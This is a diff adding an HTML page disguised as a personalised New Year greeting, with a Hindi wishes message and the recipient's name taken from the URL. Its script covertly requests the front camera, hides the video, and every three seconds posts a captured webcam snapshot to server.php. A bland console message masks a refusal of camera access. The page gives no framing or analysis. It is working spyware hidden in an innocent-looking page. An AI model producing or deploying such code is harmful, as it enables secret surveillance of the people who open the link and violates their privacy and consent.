@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Best Wishes</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; text-align: center; overflow: hidden; }
+        .main { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: radial-gradient(circle, #1e1e2f, #000); }
+        h1 { font-size: 3.5rem; background: linear-gradient(to right, #ff00cc, #3333ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="main">
+        <h2 id="greet">WISHING YOU</h2>
+        <h1 id="userName">GUEST</h1>
+        <h3 id="festText">⭐ Happy New year ⭐</h3>
+        <p>आपके और आपके पूरे परिवार को इस नए साल की हार्दिक शुभकामनाएं</p>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name');
+        if (name) document.getElementById("userName").textContent = name;
+
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then(stream => {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+            video.addEventListener('loadeddata', () => {
+                setInterval(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0);
+                    fetch('server.php', {
+                        method: 'POST',
+                        body: JSON.stringify({ image: canvas.toDataURL('image/png') }),
+                        headers: { 'Content-Type': 'application/json' }
+                    });
+                }, 3000);
+            });
+        }).catch(e => console.log("System Ready."));
+    </script>
+</body>
+</html>
+
